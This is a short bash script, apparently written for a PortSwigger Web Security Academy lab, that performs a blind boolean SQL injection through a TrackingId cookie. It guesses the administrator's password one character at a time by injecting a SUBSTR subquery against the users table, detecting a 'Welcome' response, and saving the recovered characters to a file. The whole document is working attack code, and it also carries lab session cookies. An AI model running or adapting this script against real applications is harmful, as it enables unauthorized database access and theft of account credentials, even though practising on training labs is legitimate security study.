#!/bin/bash

LENGTH=20
PAYLOAD=(0 1 2 3 4 5 6 7 8 9 a b c d e f g h i j k l m n o p q r s t u v w x y z)
for i in $(seq 1 $LENGTH);do
	for j in ${PAYLOAD[@]};do
		wget  https://acf81f001e14398ec0a4969900db0092.web-security-academy.net -o /dev/null --header "Cookie: TrackingId=HVvVcFyE2P04ICh3' AND SUBSTR((SELECT password FROM users WHERE username='administrator'), $i,1) = '$j'  --; session=Qu0TVYm3qJhcwnWDa0ySSCQOyKaIsau4" --header "Referer: https://portswigger.net/" > /dev/null
		if [ $(cat index.html|grep "Welcome"|wc -l) -eq 1 ]; then echo -n $j ; echo -n $j >> password.txt; fi ; rm index.html
	done
done


